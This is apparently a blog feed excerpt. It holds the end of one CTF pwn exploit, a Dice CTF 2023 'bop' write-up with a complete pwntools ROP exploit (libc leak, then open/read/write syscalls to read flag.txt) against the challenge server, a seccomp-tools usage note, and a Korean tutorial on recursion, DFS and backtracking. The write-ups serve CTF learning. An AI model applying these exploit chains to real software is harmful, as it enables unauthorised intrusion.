class="number">16</span>) - libc.symbols[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">            info(<span class="string">&#x27;libc_base : &#x27;</span>+<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">3</span>)) <span class="comment"># overflow</span></span><br><span class="line"></span><br><span class="line">            payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">            payload += <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x100</span>- <span class="built_in">len</span>(payload))</span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>])   <span class="comment"># [32]</span></span><br><span class="line">            payload += p64(e.got[<span class="string">&#x27;puts&#x27;</span>]+<span class="number">4</span>) <span class="comment"># [33] 7f?? =&gt; got2</span></span><br><span class="line">            </span><br><span class="line">            p.send(payload)</span><br><span class="line"></span><br><span class="line">            system_low = <span class="built_in">int</span>(<span class="built_in">hex</span>(libc.symbols[<span class="string">&#x27;system&#x27;</span>])[-<span class="number">8</span>:], <span class="number">16</span>)</span><br><span class="line">            p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="built_in">str</span>(<span class="number">1</span>)) <span class="comment"># 1</span></span><br><span class="line">            payload = <span class="string">&#x27;&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(system_low)</span><br><span class="line">            payload += <span class="string">&#x27;+&#x27;</span></span><br><span class="line">            payload += <span class="built_in">str</span>(got2)</span><br><span class="line">            pause()</span><br><span class="line">            p.send(payload)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">raise</span> NotImplementedError</span><br><span class="line">        </span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> es:</span><br><span class="line">        <span class="built_in">print</span>(es)</span><br><span class="line">        p.close()</span><br><span class="line">        <span class="comment"># p = process(&#x27;./chall&#x27;)</span></span><br><span class="line">        p = remote(<span class="string">&#x27;3.38.2.179&#x27;</span>, <span class="number">40020</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">HCAMP&#123;FUNNY_TYPECONFUSION&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Hacking Camp </tag>
            
            <tag> Type Confusion </tag>
            
            <tag> 1-day </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Dice CTF 2023 - bop (seccomp)</title>
      <link href="/230207-dicectf2023-bop/"/>
      <url>/230207-dicectf2023-bop/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://ctftime.org/event/1838">https://ctftime.org/event/1838</a></li></ul><blockquote><p><code>nc mc.ax 30284</code></p></blockquote><ul><li>[159 solves &#x2F; 117 points]</li></ul><h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">FROM pwn.red/jail:0.3.1</span><br><span class="line"></span><br><span class="line">COPY --from=ubuntu@sha256:bffb6799d706144f263f4b91e1226745ffb5643ea0ea89c2f709208e8d70c999 / /srv</span><br><span class="line">COPY flag.txt /srv/app/</span><br><span class="line">COPY bop /srv/app/run</span><br></pre></td></tr></table></figure><p>I patched the binary first before solve this binary.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      No PIE (0x3fe000)</span><br></pre></td></tr></table></figure><p>We can see the function related with <code>seccomp</code> when open the binary with IDA. So we can use the <code>seccomp-tools</code>.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>Only <code>open</code>, <code>read</code>, and <code>write</code> are available. But libc’s <code>open</code> function actually uses <code>openat</code> syscall. So We can’t use that function. We have to use the <code>open</code> syscall.</p><p>I use the <code>ropper</code> to find the <code>syscall ; ret</code> gadget.</p><h2 id="Solve"><a href="#Solve" class="headerlink" title="Solve"></a>Solve</h2><ul><li>flag.txt open, read and write</li></ul><h3 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&#x27;./bop&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;mc.ax&#x27;</span> ,<span class="number">30284</span>)</span><br><span class="line">e = ELF(<span class="string">&#x27;./bop&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">main = <span class="number">0x4012F9</span></span><br><span class="line">pop_rdi = <span class="number">0x4013d3</span></span><br><span class="line">pop_rsi_r15 = <span class="number">0x4013d1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ropper -f libc.so.6 --nocolor &gt; rop.txt</span></span><br><span class="line">pop_rdx = <span class="number">0x142c92</span> <span class="comment"># libc </span></span><br><span class="line">syscall_ret = <span class="number">0x630a9</span> <span class="comment"># libc</span></span><br><span class="line">pop_rax = <span class="number">0x36174</span> <span class="comment"># libc</span></span><br><span class="line"></span><br><span class="line">ret = <span class="number">0x40101a</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(e.got[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(e.sym[<span class="string">&#x27;printf&#x27;</span>])</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(main) <span class="comment"># main</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># pause()</span></span><br><span class="line">p.sendlineafter(<span class="string">&#x27;bop?&#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">libc.address = u64(p.recvuntil(<span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;printf&#x27;</span>]</span><br><span class="line">info(<span class="string">&#x27;libc base : &#x27;</span> + <span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">payload += <span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x20</span>+<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(0, bss, 8) flag.txt</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">11</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># open(./flag.txt) syscall</span></span><br><span class="line">payload += p64(pop_rax + libc.address)</span><br><span class="line">payload += p64(<span class="number">2</span>) <span class="comment"># open</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(syscall_ret + libc.address)</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd, bss, 100)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">3</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">100</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(1, bss, 100)</span></span><br><span class="line">payload += p64(pop_rdi)</span><br><span class="line">payload += p64(<span class="number">1</span>)</span><br><span class="line">payload += p64(pop_rsi_r15)</span><br><span class="line">payload += p64(<span class="number">0x4040A0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">payload += p64(pop_rdx + libc.address)</span><br><span class="line">payload += p64(<span class="number">100</span>)</span><br><span class="line">payload += p64(ret)</span><br><span class="line">payload += p64(libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">p.sendlineafter(<span class="string">&#x27;bop?&#x27;</span>, payload)</span><br><span class="line">p.send(<span class="string">&#x27;./flag.txt\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dice&#123;ba_da_ba_da_ba_be_bop_bop_bodda_bope_f8a01d8ec4e2&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnable - seccomp</title>
      <link href="/230206-pwn-seccomp/"/>
      <url>/230206-pwn-seccomp/</url>
      
        <content type="html"><![CDATA[<ul><li><a href="https://github.com/dr0gba/seccomp-tools">https://github.com/dr0gba/seccomp-tools</a></li></ul><h2 id="install"><a href="#install" class="headerlink" title="install"></a>install</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gem install seccomp-tools</span><br></pre></td></tr></table></figure><h2 id="use"><a href="#use" class="headerlink" title="use"></a>use</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">seccomp-tools dump [chall]</span><br></pre></td></tr></table></figure><ul><li>result</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0xc000003e  if (A != ARCH_X86_64) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x35 0x00 0x01 0x40000000  if (A &lt; 0x40000000) goto 0005</span><br><span class="line"> 0004: 0x15 0x00 0x06 0xffffffff  if (A != 0xffffffff) goto 0011</span><br><span class="line"> 0005: 0x15 0x04 0x00 0x00000000  if (A == read) goto 0010</span><br><span class="line"> 0006: 0x15 0x03 0x00 0x00000001  if (A == write) goto 0010</span><br><span class="line"> 0007: 0x15 0x02 0x00 0x00000002  if (A == open) goto 0010</span><br><span class="line"> 0008: 0x15 0x01 0x00 0x0000003c  if (A == exit) goto 0010</span><br><span class="line"> 0009: 0x15 0x00 0x01 0x000000e7  if (A != exit_group) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x00000000  return KILL</span><br></pre></td></tr></table></figure><p>Related Challenge</p><ul><li><a href="https://jiravvit.github.io/221005-d-ctf2022-destruction/">https://jiravvit.github.io/221005-d-ctf2022-destruction/</a></li><li><a href="https://jiravvit.github.io/230207-dicectf2023-bop/">https://jiravvit.github.io/230207-dicectf2023-bop/</a></li></ul><h2 id="etc"><a href="#etc" class="headerlink" title="etc"></a>etc</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">WARNING:  You don&#x27;t have /home/jir4vvit/.local/share/gem/ruby/3.0.0/bin in your PATH,</span><br><span class="line">          gem executables will not run.</span><br></pre></td></tr></table></figure><p>If you get warning as above when you use the <code>gem</code>, you execute the command below.</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">export</span> GEM_HOME=<span class="string">&quot;<span class="subst">$(ruby -e &#x27;puts Gem.user_dir&#x27;)</span>&quot;</span> </span><br><span class="line"><span class="built_in">export</span> PATH=<span class="string">&quot;<span class="variable">$PATH</span>:<span class="variable">$GEM_HOME</span>/bin&quot;</span></span><br><span class="line">gem list</span><br><span class="line">gem update</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Docs </category>
          
          <category> Pwnable </category>
          
      </categories>
      
      
        <tags>
            
            <tag> seccomp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Algorithm - Recursion, DFS, Backtracking (Baekjoon 15649, 15650, 15651, 15652 C)</title>
      <link href="/230202-algorithm-dfs_backtracking/"/>
      <url>/230202-algorithm-dfs_backtracking/</url>
      
        <content type="html"><![CDATA[<h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL;DR"></a>TL;DR</h2><ul><li><a href="https://solved.ac/en/profile/cutieee">https://solved.ac/en/profile/cutieee</a></li></ul><p>요즘 C로 백준을 꾸준히 풀고 있다. 이 글을 시점으로 Streak 54 days를 달성했다. 짝짝짝! 어제쯤 실버 2를 달성했는데 요즘 들어 알고리즘을 따로 공부해야할 필요성을 느낀다. 그냥 풀게 되면 시간 초과가 나기 일수. 혹은 문제 풀이 방향성을 잡기가 힘들다.</p><p>백준 15649, 15650, 15651, 15652 문제를 풀면서 재귀, DFS, 백트래킹 개념을 다질 수 있었다. 백준 사이트에서 <a href="https://www.acmicpc.net/step/34">단계별로 풀어보기</a>에서 백트래킹 입문 문제를 스스로 풀이하였다. 문제를 풀이하면서 얻은 지식을 블로그에 정리해놓으려고 한다.</p><p>이 글의 목표는 백트래킹을 이해하고 백준 15649, 15650, 15651, 15652 문제를 푸는 것이다.</p><h2 id="Recursion-재귀"><a href="#Recursion-재귀" class="headerlink" title="Recursion 재귀"></a>Recursion 재귀</h2><p>재귀 함수를 아래와 같이 표현할 수 있다.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">func</span><span class="params">(<span class="type">int</span> n)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (n == <span class="number">5</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, n);</span><br><span class="line">    <span class="keyword">return</span> func(n+<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    func(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>output</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure><p><code>func</code> 함수는 n+1을 인자로 자기 자신을 다시 호출한다. n이 5일 때 출력하지 않고 종료한다. </p><p>재귀 함수는 주로 가독성을 위해 쓰여진다. (이론적으로 재귀함수는 for문과 while문 등으로 표현할 수 있다.) 재귀 함수에 대한 이해가 어려운 이유는 재귀 함수를 일반 함수와 다르게 생각하기 때문이다. 사실 흔히 아는 일반 함수와 같다고 생각하면 이게 무엇인지는 바로 이해가 될 것이다.</p><h2 id="DFS"><a href="#DFS" class="headerlink" title="DFS"></a>DFS</h2><p>DFS(Depth - First - Search)는 깊이 우선 탐색을 의미한다. 어떠한 내용을 브루트 포싱할 때 제일 깊이 내려가서 아래단부터 탐색하는 것을 의미한다. 아래 gif를 보면 잘 이해가 될 것이다. </p><img src="/images/230202-algorithm-dfs_backtracking/Depth-First-Search.gif" width=350/><br>DFS는 주로 그래프나 트리와 연관되어 사용된다고 한다. 코드는 아래 백트래킹 설명에서 한꺼번에 살펴보자.<p>DFS는 조건 상관없이 모든 것을 탐색해야 한다. <code>백준 15649 N과 M (1)</code> 보다 <code>백준 15651 N과 M (3)</code> 부터 풀이를 진행하는 것이 백트래킹 이해에 더 도움이 될 듯 하다. (스포지만 (3)은 백트래킹 개념 없이 DFS만을 가지고 풀이할 수 있다.)</p><ul><li><a href="https://www.acmicpc.net/problem/15651">https://www.acmicpc.net/problem/15651</a></li></ul><h2 id="Backtracking"><a href="#Backtracking" class="headerlink" title="Backtracking"></a>Backtracking</h2><p>위의 DFS에서 봤던 트리를 잠깐 상상해보자. 정답을 찾기위해 부모 노드에서 자식 노드까지 내려간다. 이때 어떠한 조건에 부합하는 경우만 자식 노드로 내려가고 그렇지 않다면 다시 부모 노드로 올라간다. 이러한 <code>조건에 부합한다.</code>를 <strong><code>유망하다.</code></strong> 라고 표현한다. 조건에 부합하지 않은, 즉 유망하지 않은 노드는 확인을 안하기 때문에 풀이 시간을 단축할 수 있다. </p><p>트리로 예시를 들었지만 사실 구현은 큐나 재귀함수로 많이 한다고 한다. 이 글에선 재귀함수로 문제를 풀이하도록 한다. </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (정답이라면) &#123;</span><br><span class="line">        정답 출력 후 종료</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123; <span class="comment">//정답이 아니라면</span></span><br><span class="line">        <span class="keyword">for</span> (모든 자식 노드에 대해서) &#123;</span><br><span class="line">            <span class="keyword">if</span> (정답에 유망하다면) &#123;</span><br><span class="line">                자식 노드로 이동</span><br><span class="line">                DFS(depth + <span class="number">1</span>);</span><br><span class="line">                부모 노드로 이동</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>재귀 함수 밑에 나오는 문장은 어떻게 이해해야 할까?<br>정답에 유망하다면 자식 노드를 일단 선택한 뒤에, 그걸 선택한 후 해결한 뒤에, 다시 원래의 상태로 되돌린다.(부모 노드로 이동) </p><h2 id="백준-15649-N과-M-1"><a href="#백준-15649-N과-M-1" class="headerlink" title="백준 15649 N과 M (1)"></a>백준 15649 N과 M (1)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15649">https://www.acmicpc.net/problem/15649</a></p></li><li><p>1부터 N까지 자연수 중에서 <strong>중복 없이</strong> M개를 고른 수열. 한 마디로 <code>nPm</code>을 구하는 문제.</p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4 2</span><br></pre></td></tr></table></figure></li><li><p>output </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">1 2</span><br><span class="line">1 3</span><br><span class="line">1 4</span><br><span class="line">2 1</span><br><span class="line">2 3</span><br><span class="line">2 4</span><br><span class="line">3 1</span><br><span class="line">3 2</span><br><span class="line">3 4</span><br><span class="line">4 1</span><br><span class="line">4 2</span><br><span class="line">4 3</span><br></pre></td></tr></table></figure></li></ul><br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> n, m;</span><br><span class="line"><span class="type">int</span> data[<span class="number">10</span>];</span><br><span class="line"><span class="type">bool</span> visit[<span class="number">10</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">DFS</span><span class="params">(<span class="type">int</span> depth)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (depth == m) &#123;</span><br><span class="line">        <span class="comment">// print</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;%d &quot;</span>, data[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">1</span>; i &lt;= n; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (visit[i] == <span class="literal">false</span>) &#123;</span><br><span class="line">                data[depth] = i;</span><br><span class="line">                visit[i] = <span class="literal">true</span>;</span><br><span class="line">                DFS(depth+<span class="number">1</span>);</span><br><span class="line">                visit[i] = <span class="literal">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;n, &amp;m);</span><br><span class="line">    DFS(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>중복을 위해 사용한 <code>visit</code> 배열은 <code>값</code>이 사용했나 안했나를 판단하는 배열이다. (<code>값</code>을 인덱스로 활용한다.) 입력이 1부터 시작하기 때문에 <code>visit</code> 배열 인덱스를 1부터 사용한다. 지금 생각해보면 check의 네이밍이 좀 더 어울리는 것 같기도 하다. 가독성을 위하여 bool 타입으로 지정하였다. false라면 사용을 하지 않았기 때문에 <code>data</code> 배열에 값을 넣어주고 해당 값을 인덱스로 가지는 <code>visit</code> 배열을 true로 세팅한다. 그리고 그 다음 자식 노드를 탐색한다. </p><p>만약 유망하지 않다면 <code>i++</code>로 다음 반복문을 돈다. </p><p>depth가 m과 같을 경우엔 트리 끝까지 다 내려갔기 때문에 <code>data</code> 배열이 출력된다. 잊으면 안되는 것이 m이 출력해야할 숫자 수이다. 어쩌면 이 조건은 당연한 것일지도 모른다. 헷갈리지 말자. </p><p>이 문제를 이해하면 다음 2, 3, 4는 매우 쉽게 풀이할 수 있다. 내가 그랬다.</p><h2 id="백준-15650-N과-M-2"><a href="#백준-15650-N과-M-2" class="headerlink" title="백준 15650 N과 M (2)"></a>백준 15650 N과 M (2)</h2><ul><li><p><a href="https://www.acmicpc.net/problem/15650">https://www.acmicpc.net/problem/15650</a></p></li><li><p>1부터 N까지 자연수 중에서 중복 없이 M개를 고른 수열. 추가로 <strong>오름차순</strong>이어야 함.</p></li><li><p>input</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span 